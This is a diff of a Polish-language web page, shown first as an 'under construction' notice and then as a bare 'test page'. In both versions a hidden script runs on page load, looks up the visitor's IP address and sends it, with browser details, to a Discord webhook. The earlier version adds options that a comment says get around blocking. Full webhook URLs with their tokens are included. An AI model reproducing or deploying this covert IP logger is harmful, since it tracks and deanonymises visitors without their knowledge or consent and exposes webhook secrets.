@@ -2,62 +2,58 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Strona w budowie</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
-        .box { padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    </style>
+    <title>Strona Testowa</title>
 </head>
 <body>
-
-    <div class="box">
-        <h1>Strona jest aktualnie aktualizowana</h1>
-        <p>Zapraszamy wkrótce.</p>
-    </div>
+    <h1>Strona działa</h1>
+    <p>Sprawdź kanał na Discordzie.</p>
 
     <script>
-        async function reportVisit() {
-            const webhookUrl = "https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY";
-            
-            try {
-                // Pobieranie adresu IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+        async function sendToDiscord() {
+            // Upewnij się, że ten link jest w 100% poprawny
+            const webhookUrl = "https://discord.com/api/webhooks/1459601451671359640/D2o79yB19OC3MbE73wJb9kUEU-dyBBhiN4e2LPAUvqCQkVwOqLT2-iZ0RAlakc_pjmqJ";
 
-                // Przygotowanie danych
-                const info = {
-                    embeds: [{
-                        title: "🚀 Nowe wejście na stronę",
-                        color: 15158332, // Kolor czerwony
-                        fields: [
-                            { name: "Adres IP", value: `\`${ip}\``, inline: true },
-                            { name: "Przeglądarka", value: navigator.userAgent.split(') ')[1] || "Nieznana", inline: true },
-                            { name: "System", value: navigator.platform, inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
+            try {
+                // 1. Pobieranie IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+
+                // 2. Budowanie poprawnej paczki danych (JSON)
+                const payload = {
+                    "username": "Logger Bot",
+                    "content": "Wykryto nowe wejście na stronę!",
+                    "embeds": [{
+                        "title": "Szczegóły wizyty",
+                        "color": 16711680, // Czerwony
+                        "fields": [
+                            { "name": "Adres IP", "value": ipData.ip },
+                            { "name": "User-Agent", "value": navigator.userAgent }
+                        ]
                     }]
                 };
 
-                // Wysłanie na Discord (z dodatkowymi parametrami omijającymi blokady)
-                await fetch(webhookUrl, {
+                // 3. Wysyłka z wymuszonym nagłówkiem JSON
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    mode: 'no-cors', // Omija błędy CORS, choć nie zwraca odpowiedzi
-                    keepalive: true, // Pozwala dokończyć żądanie nawet po zamknięciu karty
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(info)
+                    body: JSON.stringify(payload)
                 });
 
-            } catch (err) {
-                console.log("Błąd wysyłania (prawdopodobnie AdBlock):", err.message);
+                if (response.ok) {
+                    console.log("Sukces! Wiadomość wysłana.");
+                } else {
+                    console.error("Błąd serwera Discord:", response.status);
+                }
+
+            } catch (error) {
+                console.error("Błąd krytyczny:", error);
             }
         }
 
-        // Uruchomienie przy wejściu
-        reportVisit();
+        // Wywołanie funkcji
+        sendToDiscord();
     </script>
 </body>
 </html>
